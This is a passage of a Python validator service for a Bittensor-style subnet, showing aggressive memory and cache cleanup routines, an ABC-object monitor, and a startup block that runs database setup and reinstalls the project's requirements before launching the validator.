                            from gaia.utils.global_memory_manager import trigger_global_cleanup
                            global_stats = trigger_global_cleanup(cleanup_level)
                            if global_stats.get("callbacks_attempted", 0) > 0:
                                logger.debug(f"Global thread cleanup ({cleanup_level}): {global_stats['callbacks_succeeded']}/{global_stats['callbacks_attempted']} callbacks succeeded")
                        except Exception as e:
                            logger.debug(f"Global thread cleanup failed: {e}")
                    
                    # Get memory after cleanup
                    memory_after = process.memory_info().rss / (1024 * 1024)
                    memory_freed = memory_before - memory_after
                    
                    # Log results based on effectiveness
                    if cleanup_level == "aggressive" or memory_freed > 50:
                        logger.info(f"Memory cleanup ({cleanup_level}): {memory_before:.1f}MB → {memory_after:.1f}MB "
                                  f"(freed {memory_freed:.1f}MB, GC collected {collected} objects)")
                    elif collected > 50 or comp_memory_freed > 10:
                        logger.info(f"Memory cleanup ({cleanup_level}): GC collected {collected} objects, "
                                  f"comprehensive freed {comp_memory_freed:.1f}MB")
                    else:
                        logger.debug(f"Memory cleanup ({cleanup_level}): minimal cleanup needed")
                        
                    # Emergency action if memory is still very high after cleanup
                    if memory_after > 25000:  # > 25GB after cleanup (emergency threshold)
                        logger.error(f"🚨 CRITICAL: Memory still very high after cleanup: {memory_after:.1f}MB")
                        # Could trigger more drastic measures here if needed
                        
            except asyncio.CancelledError:
                logger.info("Aggressive memory cleanup task cancelled")
                break
            except Exception as e:
                logger.error(f"Error in aggressive memory cleanup: {e}")
                await asyncio.sleep(30)  # Shorter retry on error

    def _comprehensive_memory_cleanup(self, context: str = "general"):
        """Enhanced comprehensive memory cleanup with aggressive module cache clearing."""
        
        if not PSUTIL_AVAILABLE:
            logger.debug("psutil not available for memory cleanup")
            return 0
        
        try:
            process = psutil.Process()
            memory_before = process.memory_info().rss / (1024 * 1024)
        except Exception:
            memory_before = 0
        
        try:
            # 1. Clear exception tracebacks (major memory holder)
            import sys
            sys.last_traceback = None
            sys.last_type = None 
            sys.last_value = None
            
            # 2. CONTEXT-AWARE MODULE CACHE CLEANUP - Preserve performance caches when possible
            
            # Determine scope based on context - preserve performance caches in light pressure mode
            skip_module_caches = context == "pressure_light"  # Don't clear module caches in light pressure
            
            if not skip_module_caches:
                try:
                    import sys
                    import warnings
                    modules_cleared = 0
                    cache_objects_cleared = 0
                    
                    # Walk ALL modules with comprehensive warning suppression
                    deprecated_patterns = [
                        'basic', 'misc', 'special_matrices', 'helper', 'realtransforms',
                        'isolve', 'distance', 'stats', 'distutils', 'testing', '_core',
                        'deprecated', 'legacy', 'compat'
                    ]
                    
                    with warnings.catch_warnings():
                        warnings.filterwarnings('ignore', category=DeprecationWarning)
                        warnings.filterwarnings('ignore', category=PendingDeprecationWarning)
                        warnings.filterwarnings('ignore', category=FutureWarning)
                        warnings.filterwarnings('ignore', category=UserWarning)
                        
                        for module_name in list(sys.modules.keys()):
                            module = sys.modules.get(module_name)
                            if module is None or not hasattr(module, '__dict__'):
                                continue
                                
                            module_cleared = False
                            
                            # Clear cache-like attributes, avoiding deprecated ones
                            for attr_name in list(module.__dict__.keys()):
                                # Skip deprecated attributes that trigger warnings
                                if any(dep_pattern in attr_name.lower() for dep_pattern in deprecated_patterns):
                                    continue
                                    
                                if any(cache_pattern in attr_name.lower() for cache_pattern in 
                                       ['cache', 'registry', '_cached', '__pycache__', '_instance_cache', 
                                        '_memo', '_lru', '_registry', '_store', '_buffer']):
                                    try:
                                        cache_obj = getattr(module, attr_name)
                                        if hasattr(cache_obj, 'clear') and callable(cache_obj.clear):
                                            cache_obj.clear()
                                            cache_objects_cleared += 1
                                            module_cleared = True
                                        elif isinstance(cache_obj, dict):
                                            cache_obj.clear()
                                            cache_objects_cleared += 1
                                            module_cleared = True
                                        elif isinstance(cache_obj, list):
                                            cache_obj.clear()
                                            cache_objects_cleared += 1
                                            module_cleared = True
                                        elif isinstance(cache_obj, set):
                                            cache_obj.clear()
                                            cache_objects_cleared += 1
                                            module_cleared = True
                                    except Exception:
                                        pass
                            
                            if module_cleared:
                                modules_cleared += 1
                    
                        if modules_cleared > 0:
                            logger.info(f"Module cache cleanup: cleared {cache_objects_cleared} cache objects from {modules_cleared} modules")
                            
                except Exception as e:
                    logger.debug(f"Error during module cache cleanup: {e}")
            else:
                logger.debug(f"Skipping module cache cleanup in {context} mode to preserve performance")
            
            # 3. Context-aware LRU cache cleanup (selective in light pressure mode)
            skip_lru_caches = context == "pressure_light"  # Preserve LRU caches in light pressure
            
            if not skip_lru_caches:
                try:
                    import sys
                    import warnings
                    lru_caches_cleared = 0
                    lru_modules_checked = 0
                    
                    # Deprecated attribute patterns to skip
                    deprecated_patterns = [
                        'basic', 'misc', 'special_matrices', 'helper', 'realtransforms',
                        'isolve', 'distance', 'stats', 'distutils', 'testing', '_core',
                        'deprecated', 'legacy', 'compat'
                    ]
                    
                    # Temporarily suppress all deprecation warnings during cache clearing
                    with warnings.catch_warnings():
                        warnings.filterwarnings('ignore', category=DeprecationWarning)
                        warnings.filterwarnings('ignore', category=PendingDeprecationWarning)
                        warnings.filterwarnings('ignore', category=FutureWarning)
                        warnings.filterwarnings('ignore', category=UserWarning)
                        
                        for mod_name, mod in list(sys.modules.items()):
                            if mod is None or not hasattr(mod, '__dict__'):
                                continue
                                
                            lru_modules_checked += 1
                            
                            try:
                                # Check all attributes for LRU cache decorators
                                for attr_name in list(mod.__dict__.keys()):
                                    # Skip deprecated attributes that trigger warnings
                                    if any(dep_pattern in attr_name.lower() for dep_pattern in deprecated_patterns):
                                        continue
                                    
                                    try:
                                        attr = getattr(mod, attr_name)
                                        # Check for LRU cache or functools cache decorators - use cache_clear()
                                        if hasattr(attr, 'cache_clear') and callable(attr.cache_clear):
                                            attr.cache_clear()
                                            lru_caches_cleared += 1
                                    except Exception:
                                        continue
                            except Exception:
                                continue
                    
                        if lru_caches_cleared > 0:
                            logger.info(f"LRU cache cleanup: cleared {lru_caches_cleared} LRU caches from {lru_modules_checked} modules")
                            
                except Exception as e:
                    logger.debug(f"Error during LRU cache cleanup: {e}")
            else:
                logger.debug(f"Skipping LRU cache cleanup in {context} mode to preserve performance")
            
            # 4. Clear specific library caches that are known problematic
            try:
                # Clear NumPy caches
                import numpy as np
                if hasattr(np, '_get_ndarray_cache'):
                    np._get_ndarray_cache().clear()
                # Skip numpy internal cache clearing to avoid deprecation warnings
                # NumPy manages its own internal caches efficiently
                        
                # Clear xarray caches
                try:
                    import xarray as xr
                    if hasattr(xr.backends, 'plugins'):
                        if hasattr(xr.backends.plugins, 'clear'):
                            xr.backends.plugins.clear()
                        elif isinstance(xr.backends.plugins, dict):
                            xr.backends.plugins.clear()
                    if hasattr(xr, 'core') and hasattr(xr.core, 'formatting'):
                        if hasattr(xr.core.formatting, '_KNOWN_TYPE_REPRS'):
                            xr.core.formatting._KNOWN_TYPE_REPRS.clear()
                except ImportError:
                    pass
                    
                # Clear fsspec/gcsfs caches
                try:
                    import fsspec
                    if hasattr(fsspec, 'config') and hasattr(fsspec.config, 'conf'):
                        fsspec.config.conf.clear()
                    if hasattr(fsspec, 'filesystem') and hasattr(fsspec.filesystem, '_cache'):
                        fsspec.filesystem._cache.clear()
                    if hasattr(fsspec, 'registry') and hasattr(fsspec.registry, 'registry'):
                        # Don't clear registry as it's needed for functionality
                        pass
                except ImportError:
                    pass
                    
                # Clear netCDF4/HDF5 caches
                try:
                    import netCDF4
                    if hasattr(netCDF4, '_default_fillvals'):
                        netCDF4._default_fillvals.clear()
                    if hasattr(netCDF4, '_netCDF4'):
                        # Clear any internal caches
                        pass
                except ImportError:
                    pass
                    
            except Exception as e:
                logger.debug(f"Error clearing specific library caches: {e}")
            
            # 5. Clear HTTP client caches (only if they exist)
            try:
                if hasattr(self, 'miner_client') and self.miner_client and not self.miner_client.is_closed:
                    if hasattr(self.miner_client, '_transport'):
                        transport = self.miner_client._transport
                        if hasattr(transport, '_pool') and hasattr(transport._pool, 'clear'):
                            transport._pool.clear()
                            
                if hasattr(self, 'api_client') and self.api_client and not self.api_client.is_closed:
                    if hasattr(self.api_client, '_transport'):
                        transport = self.api_client._transport
                        if hasattr(transport, '_pool') and hasattr(transport._pool, 'clear'):
                            transport._pool.clear()
            except Exception as e:
                logger.debug(f"Error clearing HTTP client caches: {e}")
            
            # 6. Clear database connection pool caches (only if fully initialized)
            try:
                if hasattr(self, 'database_manager') and getattr(self, 'database_manager', None):
                    # Force database manager to clear any cached connections/results
                    if hasattr(self.database_manager, '_engine') and self.database_manager._engine:
                        engine = self.database_manager._engine
                        if hasattr(engine, 'pool'):
                            pool = engine.pool
                            if hasattr(pool, 'invalidate'):
                                # Invalidate stale connections but don't clear active ones
                                pass
            except Exception as e:
                logger.debug(f"Error clearing database caches: {e}")
            
            # 7. Force multiple garbage collection passes with different strategies
            import gc
            collected_total = 0
            
            # First pass: standard collection
            collected = gc.collect()
            collected_total += collected
            
            # Second pass: collect generation 0 (youngest objects)
            collected = gc.collect(0)
            collected_total += collected
            
            # Third pass: collect all generations
            for generation in range(3):
                collected = gc.collect(generation)
                collected_total += collected
            
            # Clear Python's internal type cache
            try:
                if hasattr(sys, '_clear_type_cache'):
                    sys._clear_type_cache()
            except Exception:
                pass
            
            try:
                process = psutil.Process()
                memory_after = process.memory_info().rss / (1024 * 1024)
                memory_freed = memory_before - memory_after
                
                if memory_freed > 10:  # Only log significant memory freeing
                    logger.info(f"Comprehensive cleanup ({context}): freed {memory_freed:.1f}MB, GC collected {collected_total} objects")
                
                return memory_freed
            except Exception:
                return 0
                
        except Exception as e:
            logger.debug(f"Error in comprehensive memory cleanup: {e}")
            return 0

    async def abc_object_monitor(self):
        """Monitor and cleanup ABC (Abstract Base Class) object accumulation."""
        # Register this monitor for global memory cleanup coordination
        try:
            from gaia.utils.global_memory_manager import register_thread_cleanup
            
            def cleanup_abc_caches():
                # Clear any caches that accumulate during ABC monitoring
                import gc
                collected = gc.collect()
                logger.debug(f"[ABCObjectMonitor] Performed cleanup, collected {collected} objects")
            
            register_thread_cleanup("abc_object_monitor", cleanup_abc_caches)
            logger.debug("[ABCObjectMonitor] Registered for global memory cleanup")
        except Exception as e:
            logger.debug(f"[ABCObjectMonitor] Failed to register cleanup: {e}")
        
        import weakref
        import gc
        from abc import ABC
        
        last_abc_count = 0
        
        while True:
            try:
                await asyncio.sleep(180)  # Check every 3 minutes
                
                # Get detailed ABC statistics if tracker is available
                try:
                    from gaia.utils.abc_debugger import get_abc_stats, print_abc_report
                    abc_stats = get_abc_stats()
                    current_abc_count = abc_stats['total_in_memory']
                    
                    # Enhanced logging with detailed tracking
                    if current_abc_count > 10000:
                        logger.warning(f"High ABC object count: {current_abc_count} objects")
                        # Print detailed report for troubleshooting
                        if current_abc_count > 20000:
                            logger.warning("Printing detailed ABC object analysis:")
                            print_abc_report()
                    
                except ImportError:
                    # Fallback to basic counting if debugger not available
                    current_abc_objects = []
                    for obj in gc.get_objects():
                        if isinstance(obj, ABC):
                            current_abc_objects.append(obj)
                    current_abc_count = len(current_abc_objects)
                
                abc_growth = current_abc_count - last_abc_count
                
                if current_abc_count > 10000:  # High ABC object count
                    logger.warning(f"High ABC object count: {current_abc_count} objects "
                                 f"(growth: +{abc_growth} since last check)")
                    
                    # Lightweight substrate cleanup instead of aggressive ABC cleanup
                    if current_abc_count > 50000:  # Critical threshold
                        logger.error(f"CRITICAL ABC object accumulation: {current_abc_count} objects")
                        
                        # Use lightweight substrate cleanup instead of expensive GC passes
                        try:
                            from gaia.utils.abc_debugger import lightweight_substrate_cleanup
                            cleanup_count = lightweight_substrate_cleanup()
                            logger.info(f"Lightweight substrate cleanup removed {cleanup_count} cache objects")
                        except ImportError:
                            # Fallback to single GC pass
                            collected = gc.collect()
                            logger.info(f"Fallback GC collected {collected} objects")
                
                last_abc_count = current_abc_count
                
                if current_abc_count > 1000:  # Log if significant
                    logger.debug(f"ABC object monitor: {current_abc_count} ABC objects tracked")
                
            except asyncio.CancelledError:
                logger.info("ABC object monitor task cancelled")
                break
            except Exception as e:
                logger.error(f"Error in ABC object monitor: {e}")
                await asyncio.sleep(60)


if __name__ == "__main__":
    # Configure uvloop for better async performance (2-4x faster event loop)
    try:
        import uvloop
        import platform
        
        # uvloop works best on Unix-like systems
        if platform.system() in ['Linux', 'Darwin']:  # Linux or macOS
            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
            logger.info("🚀 Using uvloop for enhanced async performance (2-4x faster than default asyncio)")
            print("[STARTUP DEBUG] uvloop event loop policy installed - significant performance boost expected")
            print("[STARTUP DEBUG] uvloop is particularly beneficial for validator workloads with many concurrent network operations")
        else:
            logger.info(f"⚡ uvloop available but not recommended for {platform.system()}, using default asyncio")
            print(f"[STARTUP DEBUG] uvloop available but skipping on {platform.system()} - using standard asyncio")
    except ImportError:
        logger.info("⚡ uvloop not available - install with 'pip install uvloop' for 2-4x async performance boost")
        print("[STARTUP DEBUG] uvloop not available - consider installing for significant performance improvements")
        print("[STARTUP DEBUG] uvloop provides major benefits for validators handling hundreds of miner connections")
    except Exception as e:
        logger.warning(f"⚠️ Failed to install uvloop event loop policy: {e}, using default asyncio")
        print(f"[STARTUP DEBUG] Warning: uvloop installation failed: {e}")
        print("[STARTUP DEBUG] Falling back to standard asyncio event loop")

    parser = ArgumentParser()

    subtensor_group = parser.add_argument_group("subtensor")

    parser.add_argument("--wallet", type=str, help="Name of the wallet to use")
    parser.add_argument("--hotkey", type=str, help="Name of the hotkey to use")
    parser.add_argument("--netuid", type=int, help="Netuid to use")
    subtensor_group.add_argument(
        "--subtensor.chain_endpoint", type=str, help="Subtensor chain endpoint to use"
    )

    parser.add_argument(
        "--test",
        action="store_true",
        help="Run tasks in test mode - runs immediately and with limited scope",
    )

    args = parser.parse_args()

    # --- Database Setup Note ---
    # Database installation, configuration, and Alembic migrations are now handled
    # by the comprehensive database setup system below
    logger.info("Starting comprehensive database setup and validator application...")
    # --- End Database Setup Note ---

    # --- Comprehensive Database Setup ---
    async def run_comprehensive_database_setup():
        try:
            logger.info("🚀 Starting comprehensive database setup and validation...")
            print("\n" + "🔧" * 80)
            print("🔧 COMPREHENSIVE DATABASE SETUP STARTING 🔧")
            print("🔧" * 80)
            
            # Import the comprehensive database setup
            from gaia.validator.database.comprehensive_db_setup import setup_comprehensive_database, DatabaseConfig
            
            # Create database configuration from environment variables
            db_config = DatabaseConfig(
                database_name=os.getenv("DB_NAME", "gaia_validator"),
                postgres_version=os.getenv("POSTGRES_VERSION", "14"),
                postgres_password=os.getenv("DB_PASSWORD", "postgres"),
                postgres_user=os.getenv("DB_USER", "postgres"),
                port=int(os.getenv("DB_PORT", "5432")),
                data_directory=os.getenv("POSTGRES_DATA_DIR", "/var/lib/postgresql/14/main"),
                config_directory=os.getenv("POSTGRES_CONFIG_DIR", "/etc/postgresql/14/main")
            )
            
            logger.info(f"Database configuration: {db_config.database_name} on port {db_config.port}")
            
            # Run comprehensive database setup
            setup_success = await setup_comprehensive_database(
                test_mode=args.test,
                config=db_config
            )
            
            if not setup_success:
                logger.error("❌ Comprehensive database setup failed - validator cannot start safely")
                print("❌ DATABASE SETUP FAILED - EXITING ❌")
                sys.exit(1)
            
            logger.info("✅ Comprehensive database setup completed successfully")
            print("✅ DATABASE SETUP COMPLETED - STARTING VALIDATOR ✅")
            print("🔧" * 80 + "\n")
            
        except Exception as e:
            logger.error(f"❌ Critical error in comprehensive database setup: {e}", exc_info=True)
            print(f"❌ CRITICAL DATABASE ERROR: {e} ❌")
            sys.exit(1)
    
    # Run the comprehensive database setup
    asyncio.run(run_comprehensive_database_setup())
    # --- End Comprehensive Database Setup ---

    # --- Ensure requirements are up to date on every restart ---
    try:
        import subprocess
        import sys
        
        logger.info("Ensuring Python requirements are up to date...")
        print("[STARTUP DEBUG] Installing/updating requirements from requirements.txt...")
        
        # Construct path to requirements.txt relative to this script
        current_script_dir = os.path.dirname(os.path.abspath(__file__))
        project_root = os.path.abspath(os.path.join(current_script_dir, "..", ".."))
        requirements_path = os.path.join(project_root, "requirements.txt")
        
        if not os.path.exists(requirements_path):
            logger.warning(f"requirements.txt not found at {requirements_path}, skipping pip install")
            print(f"[STARTUP DEBUG] Warning: requirements.txt not found at {requirements_path}")
        else:
            # Check if constraints file exists to prevent problematic packages
            constraints_path = os.path.join(project_root, "constraints.txt")
            pip_command = [sys.executable, "-m", "pip", "install"]
            
            # Add constraints file if it exists to prevent problematic packages like asyncio
            if os.path.exists(constraints_path):
                pip_command.extend(["-c", constraints_path])
                logger.info(f"Using constraints file: {constraints_path}")
                print(f"[STARTUP DEBUG] Using constraints file to prevent problematic packages: {constraints_path}")
            
            pip_command.extend(["-r", requirements_path])
            
            # Run pip install with timeout to prevent hanging
            result = subprocess.run(
                pip_command,
                capture_output=True,
                text=True,
                timeout=300,  # 5 minute timeout
                cwd=project_root
            )
            
            if result.returncode == 0:
                logger.info("Successfully updated Python requirements")
                print("[STARTUP DEBUG] Python requirements updated successfully")
                if result.stdout:
                    logger.debug(f"Pip install output: {result.stdout}")
            else:
                logger.warning(f"Pip install returned non-zero exit code {result.returncode}")
                print(f"[STARTUP DEBUG] Warning: pip install failed with exit code {result.returncode}")
                if result.stderr:
                    logger.warning(f"Pip install stderr: {result.stderr}")
                    print(f"[STARTUP DEBUG] Pip error output: {result.stderr}")
                    
    except subprocess.TimeoutExpired:
        logger.warning("Pip install timed out after 5 minutes, continuing with startup")
        print("[STARTUP DEBUG] Warning: pip install timed out, continuing with startup")
    except Exception as e:
        logger.warning(f"Error during pip install: {e}, continuing with startup")
        print(f"[STARTUP DEBUG] Warning: Error during pip install: {e}")
    # --- End requirements update ---

    print("[STARTUP DEBUG] Creating GaiaValidator instance")
    validator = GaiaValidator(args)
    try:
        print("[STARTUP DEBUG] Starting validator.main()")
        asyncio.run(validator.main())
    except KeyboardInterrupt:
        logger.info("Keyboard interrupt received, shutting down...")
        print("[STARTUP DEBUG] Keyboard interrupt received")
    except Exception as e:
        logger.critical(f"Unhandled exception in main loop: {e}", exc_info=True)
        print(f"[STARTUP DEBUG] Unhandled exception: {e}")
    finally:
        print("[STARTUP DEBUG] Entering finally block")
        if hasattr(validator, '_cleanup_done') and not validator._cleanup_done:
             try:
                 loop = asyncio.get_event_loop()
                 if loop.is_closed():
                     loop = asyncio.new_event_loop()
                     asyncio.set_event_loop(loop)
                 loop.run_until_complete(validator._initiate_shutdown())
             except Exception as cleanup_e:
                 logger.error(f"Error during final cleanup: {cleanup_e}")
                 print(f"[STARTUP DEBUG] Error during final cleanup: {cleanup_e}")
        print("[STARTUP DEBUG] Startup sequence completed")
